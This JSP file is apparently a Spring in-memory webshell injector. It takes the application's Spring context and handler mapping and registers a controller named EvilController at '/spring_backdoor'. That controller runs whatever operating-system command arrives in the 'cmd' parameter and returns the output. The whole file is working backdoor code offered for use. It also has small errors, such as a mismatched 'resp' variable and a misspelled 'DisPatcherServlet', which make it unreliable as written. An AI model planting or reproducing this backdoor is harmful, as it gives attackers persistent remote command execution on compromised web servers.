<%@ page import="org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping" %>
<%@ page import="org.springframework.web.servlet.mvc.method.RequestMappingInfo" %>
<%@ page import="org.springframework.web.context.WebApplicationContext" %>
<%@ page import="org.springframework.web.context.request.RequestContextHolder" %>
<%@ page import="org.springframework.web.bind.annotation.RequestMethod" %>
<%@ page import="javax.servlet.http.*" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.*" %>
<%@ page import="org.springframework.web.context.request.RequestAttributes" %>
<%@ page import="org.springframework.web.servlet.DispatcherServlet" %>
<% 
    class EvilController {
        public void evilMethod(HttpServletRequest req,HttpServletResponse res) throws Exception{
            String cmd = req.getParameter("cmd");
        if (cmd != null && !cmd.isEmpty()) {
            resp.setContentType("text/html;charset=UTF-8");
            PrintWriter out = resp.getWriter();
        
        try {
                Process p = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(
                    new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    out.println(line);
                }
                p.waitFor();
            } catch (Exception e) {
                out.println("Error: " + e);
            }
             out.flush();
        }
    }
    WebApplicationContext context=null;
    try{
        context=(WebApplicationContext)req.getServletContext().getAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);
        if(context==null){
            context=RequestContextHolder.currentRequestAttributes().getAttribute(DisPatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE,RequestAttributes.SCOPE_REQUEST);
        }
        if(context==null){
             throw new Exception("无法获取 Spring 上下文");
        }
      }catch(Exception e){
        e.printStackTrace(new PrintWriter(out));
    return;
      }
      RequestMappingHandlerMapping handlerMapping=null;
      try{
        handlerMapping=context.getBean(RequestMappingHandlerMapping.class);
        if(handlerMapping==null){
            throw new Exception("无法获取 HandlerMapping");
        }
      }catch(Exception e){
        e.printStackTrace(new PrintWriter(out));
    return;
      }
      try{
        EvilController myController=new EvilController();

        Method evilMethod=EvilController.class.getMethod("evilMethod",HttpServletRequest.class,HttpServletResponse.class);

      RequestMappingInfo mappingInfo=RequestMappingInfo.path("/spring_backdoor").method(RequestMethod.GET).build();
      handlerMapping.registerMapping(mappingInfo,myController,evilMethod);
      }catch(Exception e){
        throw e;
      }
      
%>